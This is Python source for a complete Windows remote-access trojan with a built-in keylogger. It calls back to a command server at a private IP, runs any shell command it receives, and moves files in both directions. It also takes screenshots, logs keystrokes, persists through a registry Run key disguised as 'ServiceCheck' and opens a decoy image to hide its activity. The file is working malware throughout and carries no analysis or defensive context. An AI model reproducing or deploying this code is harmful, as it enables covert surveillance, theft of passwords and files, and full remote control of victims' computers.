#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import sys
import shutil
import base64
import requests
import ctypes
from mss import mss
import threading
import pynput.keyboard

ServerIP="10.0.2.4"
ServerPort=56789
File_Location=os.environ["appdata"] + "\\src.exe"
ImageFile="\csiememe.jpg"
kl_file=os.environ["appdata"] + "\\srv.txt"
keys= ""

def process_keys(key):
    global keys
    try:
        keys += str(key.char)
    except AttributeError:
        if key == key.space:
            keys += " "
        elif key == key.enter:
            keys += "\n"
        elif key == key.up:
            exit
        elif key == key.down:
            exit
        elif key == key.left:
            exit
        elif key == key.right:
            exit
        else:
            keys = keys + " [" + str(key) + "] "

def writekeys():
    global keys
    with open(kl_file , "a") as klfile:
        klfile.write(keys)
        keys = ""
        klfile.close()
        timer = threading.Timer(5, writekeys)
        timer.start()

def kl_start():
    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
    with keyboard_listener:
        writekeys()
        keyboard_listener.join()
        

def reliable_send(data):
    json_data = json.dumps(data)
    s.send(bytes(json_data,encoding="utf-8"))

def reliable_recv():
    json_data = bytearray(0)
    while True:
        try:
            json_data += s.recv(1024)
            # print(json_data)
            return json.loads(json_data)
        except ValueError:
            continue

def connection():
    while True:
        try:
            s.connect((ServerIP,ServerPort))
            communication()
        except:
            time.sleep(20)
            continue

def communication():
    #Communicate
    while True:
        #command = s.recv(1024)
        command = reliable_recv()
        # print(command)
        if command == "q":
            try:
                os.remove(kl_file)
            except:
                A= 1+2
                B= 3+4
                continue
            break
        elif command[:4] == "help":
            help_data = "                cd [path]            Change Directory\n                download [filename]  Download file from client to server\n                upload [filename]    Upload file from server to client\n                get [url]            Get file from URL\n                start [program]      Start a program\n                screenshot           Take screenshot\n                check                Check administrator proviledges\n                keylog_start         Start keylogger\n                keylog_dump          Show keylog data\n                [command]            CMD command\n                q                    quit"
            reliable_send(help_data)
        elif command[:2] == "cd" and len(command) >1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            try:
                with open(command[9:], "rb") as file_down:
                    content = file_down.read()
                    reliable_send(base64.b64encode(content).decode("ascii"))
            except:
                failed = "[!!] Fail to download!"
                reliable_send(failed)
        elif command[:6] == "upload":
            result =reliable_recv()
            if result[:4] != "[!!]":
                with open(command[7:],"wb") as file_up:
                    file_up.write(base64.b64decode(result))
        elif command[:3] == "get":
            try:
                url = command[4:]
                get_response = requests.get(url)
                # get http://10.0.2.4/file.txt
                file_name = url.split("/")[-1]
                with open(file_name,"wb") as out_file:
                    out_file.write(get_response.content)
                reliable_send("[+] File Downloaded!")
            except:
                reliable_send("[!!] Download Failed!")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:],shell=True)
                reliable_send("[+] Program Started!")
            except:
                reliable_send("[!!] Program Cannot Start!")
        elif command[:10] == "screenshot":
            try:
                with mss() as screenshot:
                    screenshot.shot()
                with open("monitor-1.png","rb") as ss:
                    reliable_send(base64.b64encode(ss.read()).decode("ascii"))

                os.remove("monitor-1.png")
            except:
                reliable_send("[!!] Failed to Take Screenshot!")
        elif command[:5] == "check":
            try:
                os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
                reliable_send("[+] Great, You have Administrator Priviledges!")
            except:
                reliable_send("[!!] Sorry, You are not Administrator!")
        elif command[:12] == "keylog_start":
            kl_thread = threading.Thread(target=kl_start)
            kl_thread.start()
        elif command[:11] == "keylog_dump":
            kl_data = open(kl_file , "r")
            reliable_send(kl_data.read())
        else:
            # response = "The response message!!"
            proc=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            response=proc.stdout.read()+proc.stderr.read()
            # print(response)
            #s.send(response)
            reliable_send(response.decode('950'))

#Self duplicate
if not os.path.exists(File_Location):
    shutil.copyfile(sys.executable,File_Location)
    # Registry
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ServiceCheck /t REG_SZ /d "' + File_Location + '"' , shell=True)

#Open an Image
img = sys._MEIPASS + ImageFile 
try:
    subprocess.Popen(img,shell=True)
except:
    A=1
    B=2
    SUB = A + B
    Amazing_SUM = A - B

#Establish Socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#Connect
#s.connect((ServerIP,ServerPort))
#print("Connection Established!")
connection()


#Disconnect
s.close()

